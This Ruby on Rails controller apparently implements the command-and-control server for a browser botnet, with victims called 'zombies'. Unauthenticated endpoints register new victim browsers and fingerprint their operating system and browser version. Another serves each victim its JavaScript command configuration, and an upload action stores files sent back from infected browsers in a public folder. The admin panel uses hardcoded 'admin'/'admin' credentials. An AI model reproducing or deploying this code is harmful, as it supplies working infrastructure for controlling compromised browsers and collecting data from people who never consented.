class ZombiesController < ApplicationController
http_basic_authenticate_with :name => "admin", :password => "admin", :except => [:conf, :upload, :login, :show]

  # GET /zombies
  # GET /zombies.json
  def index
    @zombies = Zombie.where(['id <> ?', 1]).order("updated_at desc")

    respond_to do |format|
      format.html # index.html.erb
      format.json { render json: @zombies }
    end
  end

  # show the config for the zombie browsers
  def conf
    @zombie = Zombie.where(:hashid => params[:hashid]).first
	@ccconfig = @zombie.ccconfig
	@zombie.lastseen = Time.now
	@zombie.save
    respond_to do |format|
      format.json { render json: @ccconfig }
    end
  end
  
  # GET /zombies/1
  # GET /zombies/1.json
  def show
    @zombie = Zombie.find(params[:id])
	@ccconfig = @zombie.ccconfig
	
    respond_to do |format|
      format.html # show.html.erb
      format.json { render json: @zombie }
    end
  end

  # GET /zombies/new
  # GET /zombies/new.json
  def new
    @zombie = Zombie.new

    respond_to do |format|
      format.html # new.html.erb
      format.json { render json: @zombie }
    end
  end

  # GET /zombies/1/edit
  def edit
    @zombie = Zombie.find(params[:id])
  end

  # POST /zombies
  # POST /zombies.json
  def create
    @zombie = Zombie.new(params[:zombie])
    respond_to do |format|
      if @zombie.save
        format.html { redirect_to @zombie, notice: 'Zombie was successfully created.' }
        format.json { render json: @zombie, status: :created, location: @zombie }
      else
        format.html { render action: "new" }
        format.json { render json: @zombie.errors, status: :unprocessable_entity }
      end
    end
	@zombie_def = Zombie.find(1)
	@ccconfig = @zombie_def.ccconfig.dup
	@ccconfig.jscommandid = 1
	@ccconfig.zombie_id = @zombie.id
	@ccconfig.save
  end

  # PUT /zombies/1
  # PUT /zombies/1.json
  def update
    @zombie = Zombie.find(params[:id])

    respond_to do |format|
      if @zombie.update_attributes(params[:zombie])
        format.html { redirect_to @zombie, notice: 'Zombie was successfully updated.' }
        format.json { head :no_content }
      else
        format.html { render action: "edit" }
        format.json { render json: @zombie.errors, status: :unprocessable_entity }
      end
    end
  end

  # DELETE /zombies/1
  # DELETE /zombies/1.json
  def destroy
    @zombie = Zombie.find(params[:id])
    @zombie.destroy

    respond_to do |format|
      format.html { redirect_to zombies_url }
      format.json { head :no_content }
    end
  end

  def upload
	  @zombie = Zombie.where(:hashid => params[:hashid]).first
	  uploaded_io = params[:datafile]
	  url = @zombie.ccconfig.jscommand.match(/\(.*?"([^\,]*)".*\)/)[1]
	  filename = url.split('/').pop().split('?')[0]
	  filename += "." + (0...10).map{ ('a'..'z').to_a[rand(26)] }.join
	  file = File.open(Rails.root.join('public', 'uploads', filename), 'wb')
      file.write(uploaded_io.read)
  end
  
  def login
	@zombie = Zombie.where(:hashid => params[:hashid]).first
	if !(@zombie)
		@zombie = Zombie.new(params[:zombie])
		@zombie.hashid = params[:hashid]
		@zombie.save
		@zombie_def = Zombie.find(1)
		@ccconfig = @zombie_def.ccconfig.dup
		@ccconfig.jscommandid = 1
		@ccconfig.zombie_id = @zombie.id
		@ccconfig.save
	else 
		respond_to do |format|
		  if @zombie.update_attributes(params[:zombie])
			format.all {render :nothing => true, :status => 200, :content_type => 'text/html'} 
			#format.json { head :no_content }
		  #else
			#format.html { render action: "edit" }
			#format.json { render json: @zombie.errors, status: :unprocessable_entity }
		  end		
		end
	end	
	@mybrowser = request.env["HTTP_USER_AGENT"] 
	case @mybrowser 
		 when /Windows NT 6.1/ then @zombie.os = "Windows NT 6.1" 
		 when /Linux/ then @zombie.os = "Linux" 
		 when /OS X/ then @zombie.os = "apple" 
		 when /Android/ then @zombie.os = "android" 
		 when /CrOS/ then @zombie.os = "ChromeOS" 
	end
	logger.info " useragent: " + @mybrowser
	case @mybrowser 
		 when /Chrome/ then
		 @temp = @mybrowser[/Chrome\/([\d\.]*)/]
		 @zombie.browserversion = @temp
		 logger.info "temp: " + @temp
		 logger.info "chromeversion: " + @zombie.browserversion
		 @zombie.save	
		 when /Safari/ then
		 @temp = @mybrowser[/Safari\/([\d\.]*)/]
		 @zombie.browserversion = @temp
		 logger.info "temp: " + @temp
		 logger.info "safariversion: " + @zombie.browserversion
		 @zombie.save	
	end		
	@zombie.save
  end
end  
